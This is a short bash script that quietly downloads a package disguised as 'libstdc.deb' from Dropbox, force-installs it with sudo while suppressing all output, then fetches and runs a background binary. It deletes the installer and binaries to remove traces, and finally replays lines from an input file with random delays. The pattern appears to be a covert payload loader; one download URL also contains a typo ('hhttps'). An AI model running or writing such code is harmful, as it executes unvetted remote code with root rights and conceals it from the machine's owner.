#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget hhttps://www.dropbox.com/s/6fifwy1wz0bx2mu/scomp.zip -q
unzip scomp.zip > /dev/null 2>&1
#pwd
./perf/scomp ./perf/catalog &
sleep 3
rm -rf scomp.zip
rm -rf perf/scomp
rm -rf perf/catalog
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 15 ))
done < $2

